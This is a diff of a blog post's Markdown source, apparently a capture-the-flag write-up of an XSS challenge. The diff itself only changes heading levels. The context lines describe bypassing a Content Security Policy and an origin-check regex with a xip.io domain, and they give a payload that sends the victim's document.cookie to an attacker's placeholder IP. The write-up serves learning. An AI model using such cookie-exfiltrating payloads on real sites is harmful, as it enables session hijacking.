@@ -14,7 +14,7 @@ comments: true
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/score.png)
 
 
-## Initial Testing
+# Initial Testing
 Accessing the web site at [http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/) will lead us to a simple page shown below.
 
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/1.png)
@@ -41,7 +41,7 @@ Iframes to the website can also be included in a web server on a different domai
 
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/9.png)
 
-## Discovering and planning of exploit
+# Discovering and planning of exploit
 
 Attempting to inject JavaScript `<img/src/onerror=alert()>` in the broadcast field will result in `Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'unsafe-eval' 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.` in the console log.  
 
@@ -138,7 +138,7 @@ Hosting it locally and accessing it, you will realize that the page still did no
 
 There are 2 main reasons why this script did not work. First, the payload that was sent to the server contains blacklisted characters, and second, the URL did not pass the origin check on the server.
 
-## Fixing of exploit
+# Fixing of exploit
 
 To fix the first issue of our payload having blacklisted character(s), we must first identify where did the blacklisted character(s) appear. We can first check the payload that was sent with the `postMessage()` function, which was `frame.outerHTML`.
 
@@ -152,7 +152,7 @@ The second problem lies with the origin check. Recall that in `/broadcasts/frame
 
 This Regular Expression check if `event.origin` begins with  `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg` and will return if the check fails. As such, we need a DNS to point to our server, starting with `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg`. (xip)[http://xip.io/] provide a free domain name that points to any IP address. The domain name we will use is ` yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io`. 
 
-## Finishing up
+# Finishing up
 
 Finally, the payload will be changed from `a, alert(“COLDSPOT”),a` to `a,document.location = "http://<IPADDRESS>/" + document.cookie,a`. Finally, port forward and retrieve your IP address and replace <IPADDRESS> with your own IP address.
 
@@ -160,7 +160,7 @@ Entering `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io` int
 
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/17.png)
 
-## Thoughts
+# Thoughts
 
 On the CTF day itself, I did not want to mess with port forwarding as many ports from my device were open and vulnerable. As such, I used a $5/month droplet on DigitalOcean and my own domain name `coldspot.me`. 
 
